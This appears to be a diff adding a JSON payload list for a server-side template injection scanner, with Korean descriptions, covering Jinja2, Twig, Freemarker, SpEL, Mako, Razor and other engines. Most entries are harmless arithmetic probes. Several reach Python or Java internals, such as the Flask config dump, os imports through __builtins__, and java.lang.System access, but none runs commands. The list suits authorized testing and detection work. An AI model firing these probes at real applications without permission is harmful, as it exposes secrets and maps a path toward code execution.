@@ -1,0 +1,332 @@
+{
+  "_meta": {
+    "version": "1.2.0",
+    "policy": "PoC 전용. 실제 명령 실행 페이로드 미포함."
+  },
+
+  "generic": [
+    {
+      "name": "Universal Math Detection",
+      "payload": "{{1337*1337}}",
+      "expected": "1787569",
+      "attack_type": "ssti:jinja2_twig",
+      "risk_level": "LOW",
+      "description": "중괄호 두 개를 사용하는 모든 엔진 기본 탐지"
+    },
+    {
+      "name": "Jinja2 Fingerprint",
+      "payload": "{{1337*'2'}}",
+      "expected": "2674",
+      "attack_type": "ssti:jinja2",
+      "risk_level": "LOW",
+      "description": "Jinja2 전용 - 1337*'2' = 2674 (정수 곱셈)"
+    },
+    {
+      "name": "Twig Fingerprint",
+      "payload": "{{1337*'2'}}",
+      "expected": "13371337",
+      "attack_type": "ssti:twig",
+      "risk_level": "LOW",
+      "description": "Twig 전용 - 1337*'2' = 13371337 (문자열 반복)"
+    }
+  ],
+
+  "jinja2": [
+    {
+      "name": "Jinja2 Math Detection",
+      "payload": "{{1337*1337}}",
+      "expected": "1787569",
+      "attack_type": "ssti:jinja2",
+      "risk_level": "LOW",
+      "description": "Python Jinja2 엔진 기본 탐지"
+    },
+    {
+      "name": "Jinja2 Config Object Disclosure",
+      "payload": "{{config}}",
+      "expected": "<Config",
+      "attack_type": "ssti:jinja2",
+      "risk_level": "MEDIUM",
+      "description": "Flask config 객체 노출 여부 확인 (SECRET_KEY 노출 가능)"
+    },
+    {
+      "name": "Jinja2 Class MRO (Python 3)",
+      "payload": "{{ ''.__class__.__mro__ }}",
+      "expected": "<class 'str'>",
+      "attack_type": "ssti:jinja2",
+      "risk_level": "HIGH",
+      "description": "Python 3 클래스 계층 접근 가능 여부 확인"
+    },
+    {
+      "name": "Jinja2 Class MRO (Python 2)",
+      "payload": "{{ ''.__class__.__mro__ }}",
+      "expected": "<type 'str'>",
+      "attack_type": "ssti:jinja2",
+      "risk_level": "HIGH",
+      "description": "Python 2 환경 대응"
+    },
+    {
+      "name": "Jinja2 OS Detection (POSIX)",
+      "payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').name }}",
+      "expected": "posix",
+      "attack_type": "ssti:jinja2",
+      "risk_level": "HIGH",
+      "description": "POSIX 환경(Linux/Mac)에서 os 모듈 import 가능 여부"
+    },
+    {
+      "name": "Jinja2 OS Detection (Windows)",
+      "payload": "{{ self.__init__.__globals__.__builtins__.__import__('os').name }}",
+      "expected": "nt",
+      "attack_type": "ssti:jinja2",
+      "risk_level": "HIGH",
+      "description": "Windows 환경에서 os 모듈 import 가능 여부"
+    }
+  ],
+
+  "twig": [
+    {
+      "name": "Twig Math Detection",
+      "payload": "{{1337*1337}}",
+      "expected": "1787569",
+      "attack_type": "ssti:twig",
+      "risk_level": "LOW",
+      "description": "PHP Twig 엔진 기본 탐지"
+    },
+    {
+      "name": "Twig Engine Confirmation",
+      "payload": "{{1337*'2'}}",
+      "expected": "13371337",
+      "attack_type": "ssti:twig",
+      "risk_level": "LOW",
+      "description": "Twig 전용 동작 - 문자열 반복으로 엔진 확정"
+    },
+    {
+      "name": "Twig Filter Capability",
+      "payload": "{{ 'sstivuln'|upper }}",
+      "expected": "SSTIVULN",
+      "attack_type": "ssti:twig",
+      "risk_level": "MEDIUM",
+      "description": "Twig 필터 호출 가능 여부 검증 (입력 sstivuln이 SSTIVULN으로 변환되는지 확인)"
+    }
+  ],
+
+  "freemarker": [
+    {
+      "name": "Freemarker Math Detection",
+      "payload": "${1337*1337}",
+      "expected": "1787569",
+      "attack_type": "ssti:freemarker",
+      "risk_level": "LOW",
+      "description": "Java Freemarker 엔진 기본 탐지"
+    },
+    {
+      "name": "Freemarker Class Access Probe",
+      "payload": "${1234567*7654321}",
+      "expected": "9449772114007",
+      "attack_type": "ssti:freemarker",
+      "risk_level": "HIGH",
+      "description": "Freemarker 큰 수 연산으로 SSTI 식별 (우연 매칭 불가)"
+    }
+  ],
+
+  "erb": [
+    {
+      "name": "Ruby ERB Math Detection",
+      "payload": "<%= 1337*1337 %>",
+      "expected": "1787569",
+      "attack_type": "ssti:erb",
+      "risk_level": "LOW",
+      "description": "Ruby ERB 엔진 기본 탐지"
+    },
+    {
+      "name": "Ruby ERB Class Hierarchy",
+      "payload": "<%= self.class %>",
+      "expected": "Object",
+      "attack_type": "ssti:erb",
+      "risk_level": "MEDIUM",
+      "description": "Ruby 객체 컨텍스트 노출 확인"
+    }
+  ],
+
+  "velocity": [
+    {
+      "name": "Velocity Math Detection",
+      "payload": "#set($$m=1337*1337)$$m",
+      "expected": "1787569",
+      "attack_type": "ssti:velocity",
+      "risk_level": "LOW",
+      "description": "Java Velocity 엔진의 변수 할당 및 출력 검증"
+    },
+    {
+      "name": "Velocity Class Inspect Access",
+      "payload": "#set($cl=$class.inspect('java.lang.System').type)$cl",
+      "expected": "class java.lang.System",
+      "attack_type": "ssti:velocity",
+      "risk_level": "HIGH",
+      "description": "Java 클래스 로더 접근 가능 여부 확인"
+    }
+  ],
+
+  "smarty": [
+    {
+      "name": "Smarty Math Detection",
+      "payload": "{1337*1337}",
+      "expected": "1787569",
+      "attack_type": "ssti:smarty",
+      "risk_level": "LOW",
+      "description": "PHP Smarty 엔진 기본 탐지 (단일 중괄호 문법)"
+    },
+    {
+      "payload": "{1234567*7654321}",
+      "expected": "9449772114007",
+      "attack_type": "ssti:smarty",
+      "risk_level": "MEDIUM",
+      "description": "Smarty 산술 평가 가능 여부 (큰 수로 우연 매칭 차단)"
+    }
+  ],
+
+  "spel": [
+    {
+      "name": "Spring SpEL Math Detection",
+      "payload": "${1337*1337}",
+      "expected": "1787569",
+      "attack_type": "ssti:spel",
+      "risk_level": "LOW",
+      "description": "Spring Expression Language 기본 탐지"
+    },
+    {
+      "name": "SpEL T() Operator (Linux)",
+      "payload": "${T(java.lang.System).getProperty(\"os.name\")}",
+      "expected": "Linux",
+      "attack_type": "ssti:spel",
+      "risk_level": "HIGH",
+      "description": "T() 연산자로 Java System 클래스 접근 가능 여부 (Linux)"
+    },
+    {
+      "name": "SpEL T() Operator (Windows)",
+      "payload": "${T(java.lang.System).getProperty(\"os.name\")}",
+      "expected": "Windows",
+      "attack_type": "ssti:spel",
+      "risk_level": "HIGH",
+      "description": "T() 연산자로 Java System 클래스 접근 가능 여부 (Windows)"
+    }
+  ],
+
+  "thymeleaf": [
+    {
+      "name": "Thymeleaf Preprocessing Detection",
+      "payload": "__${1337*1337}__::.x",
+      "expected": "1787569",
+      "attack_type": "ssti:thymeleaf",
+      "risk_level": "LOW",
+      "description": "Thymeleaf 전처리 문법(__${...}__) 탐지 (내부적으로 SpEL 평가됨)"
+    },
+    {
+      "name": "Thymeleaf Inline Expression Detection",
+      "payload": "[[${1337*1337}]]",
+      "expected": "1787569",
+      "attack_type": "ssti:thymeleaf",
+      "risk_level": "LOW",
+      "description": "Thymeleaf 인라인 표현식 문법 탐지"
+    }
+  ],
+
+  "mako": [
+    {
+      "name": "Mako Math Detection",
+      "payload": "${1337*1337}",
+      "expected": "1787569",
+      "attack_type": "ssti:mako",
+      "risk_level": "LOW",
+      "description": "Python Mako 엔진 기본 탐지"
+    },
+    {
+      "name": "Mako OS Detection (POSIX)",
+      "payload": "${self.module.__builtins__['__import__']('os').name}",
+      "expected": "posix",
+      "attack_type": "ssti:mako",
+      "risk_level": "HIGH",
+      "description": "Mako 내장 함수 접근 가능 여부 (POSIX 환경)"
+    },
+    {
+      "name": "Mako OS Detection (Windows)",
+      "payload": "${self.module.__builtins__['__import__']('os').name}",
+      "expected": "nt",
+      "attack_type": "ssti:mako",
+      "risk_level": "HIGH",
+      "description": "Mako 내장 함수 접근 가능 여부 (Windows 환경)"
+    }
+  ],
+
+  "tornado": [
+    {
+      "name": "Tornado Math Detection",
+      "payload": "{{1337*1337}}",
+      "expected": "1787569",
+      "attack_type": "ssti:tornado",
+      "risk_level": "LOW",
+      "description": "Python Tornado 템플릿 엔진 기본 탐지"
+    },
+    {
+      "name": "Tornado Import Capability (POSIX)",
+      "payload": "{{__import__('os').name}}",
+      "expected": "posix",
+      "attack_type": "ssti:tornado",
+      "risk_level": "HIGH",
+      "description": "Tornado 컨텍스트에서 __import__ 호출 가능 여부 (POSIX)"
+    },
+    {
+      "name": "Tornado Import Capability (Windows)",
+      "payload": "{{__import__('os').name}}",
+      "expected": "nt",
+      "attack_type": "ssti:tornado",
+      "risk_level": "HIGH",
+      "description": "Tornado 컨텍스트에서 __import__ 호출 가능 여부 (Windows)"
+    }
+  ],
+
+  "pebble": [
+    {
+      "name": "Pebble Math Detection",
+      "payload": "{{1337*1337}}",
+      "expected": "1787569",
+      "attack_type": "ssti:pebble",
+      "risk_level": "LOW",
+      "description": "Java Pebble 엔진 기본 탐지"
+    },
+    {
+      "name": "Pebble Filter Capability",
+      "payload": "{{ 'sstivuln' | upper }}",
+      "expected": "SSTIVULN",
+      "attack_type": "ssti:pebble",
+      "risk_level": "MEDIUM",
+      "description": "Pebble 필터 호출 가능 여부 확인"
+    }
+  ],
+
+  "razor": [
+    {
+      "name": "ASP.NET Razor Math Detection",
+      "payload": "@(1337*1337)",
+      "expected": "1787569",
+      "attack_type": "ssti:razor",
+      "risk_level": "LOW",
+      "description": "C# ASP.NET Razor 엔진의 인라인 식 검증"
+    },
+    {
+      "name": "Razor OS Platform Detection (Linux)",
+      "payload": "@(System.Environment.OSVersion.Platform)",
+      "expected": "Unix",
+      "attack_type": "ssti:razor",
+      "risk_level": "HIGH",
+      "description": "ASP.NET 환경에서 OS 플랫폼 조회 (Linux/Unix)"
+    },
+    {
+      "name": "Razor OS Platform Detection (Windows)",
+      "payload": "@(System.Environment.OSVersion.Platform)",
+      "expected": "Win32NT",
+      "attack_type": "ssti:razor",
+      "risk_level": "HIGH",
+      "description": "ASP.NET 환경에서 OS 플랫폼 조회 (Windows)"
+    }
+  ]
+}
